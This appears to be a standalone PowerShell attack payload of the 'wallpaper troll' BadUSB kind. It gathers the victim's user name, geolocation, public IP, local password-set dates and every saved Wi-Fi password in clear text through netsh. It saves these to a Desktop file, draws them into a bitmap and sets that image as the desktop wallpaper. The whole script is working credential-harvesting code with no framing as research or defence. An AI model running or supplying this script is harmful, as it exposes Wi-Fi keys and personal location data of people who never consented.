# Gather Information
$info = @{}
$info.Name = (Get-WmiObject -Class Win32_ComputerSystem).UserName
$geo = Invoke-RestMethod -Uri 'http://ip-api.com/json'
$info.GeoLocation = $geo.lat + ', ' + $geo.lon
$info.PublicIP = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip
$info.PasswordLastSet = (Get-LocalUser | Select-Object Name, PasswordLastSet | Out-String)
$info.WifiPasswords = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
    $_ -match 'All User Profile\s*:\s*(.*)' | Out-Null
    $profile = $matches[1]
    netsh wlan show profile name=$profile key=clear | Select-String 'Key Content' | ForEach-Object {
        $_ -match 'Key Content\s*:\s*(.*)' | Out-Null
        $info.WifiPasswords += "$profile: $($matches[1])`n"
    }
}

# Save Information to File
$info | Out-File -FilePath $env:USERPROFILE\Desktop\info.txt

# Convert to BMP
$bmpPath = $env:USERPROFILE + '\Desktop\info.bmp'
$hiddenMessage = 'This is a hidden message'
$image = New-Object System.Drawing.Bitmap 800, 600
$graphics = [System.Drawing.Graphics]::FromImage($image)
$graphics.Clear([System.Drawing.Color]::White)
$font = New-Object System.Drawing.Font 'Arial', 12
$brush = [System.Drawing.Brushes]::Black
$graphics.DrawString((Get-Content $env:USERPROFILE\Desktop\info.txt), $font, $brush, [System.Drawing.PointF]::new(10, 10))
$graphics.DrawString($hiddenMessage, $font, $brush, [System.Drawing.PointF]::new(10, 580))
$image.Save($bmpPath, [System.Drawing.Imaging.ImageFormat]::Bmp)

# Set Wallpaper
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public const int SPI_SETDESKWALLPAPER = 20;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;
    public static void SetWallpaper(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
"@
[Wallpaper]::SetWallpaper($bmpPath)
